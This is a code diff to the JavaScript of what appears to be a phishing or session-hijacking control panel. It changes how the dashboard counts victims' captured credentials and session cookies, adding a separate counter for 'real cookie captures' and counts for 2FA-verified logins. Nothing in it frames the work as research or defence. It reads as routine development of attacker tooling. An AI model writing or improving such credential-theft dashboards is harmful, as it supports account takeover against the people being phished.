@@ -3886,6 +3886,7 @@ async function loadEvents(){
             if (hasCookies || isMfa) {
                 // 2FA No Cookies counts as Correct (credentials verified, just no cookies)
                 correct++;
+                if (hasCookies) totalCookies++;
             } else {
                 // Email + Pass + No cookies = Incorrect
                 incorrect++;
@@ -3960,7 +3961,7 @@ async function loadEvents(){
     tbody.appendChild(fragment);
 
     // Update stats UI
-    if(document.getElementById('stat-total-cookies')) document.getElementById('stat-total-cookies').textContent = correct; // Total Cookies = Correct
+    if(document.getElementById('stat-total-cookies')) document.getElementById('stat-total-cookies').textContent = totalCookies; // Total Cookies = only real cookie captures
     if(document.getElementById('stat-incorrect')) document.getElementById('stat-incorrect').textContent = incorrect;
     if(document.getElementById('stat-correct')) document.getElementById('stat-correct').textContent = correct;
     if(document.getElementById('stat-visits')) document.getElementById('stat-visits').textContent = uniqueSessions.size;
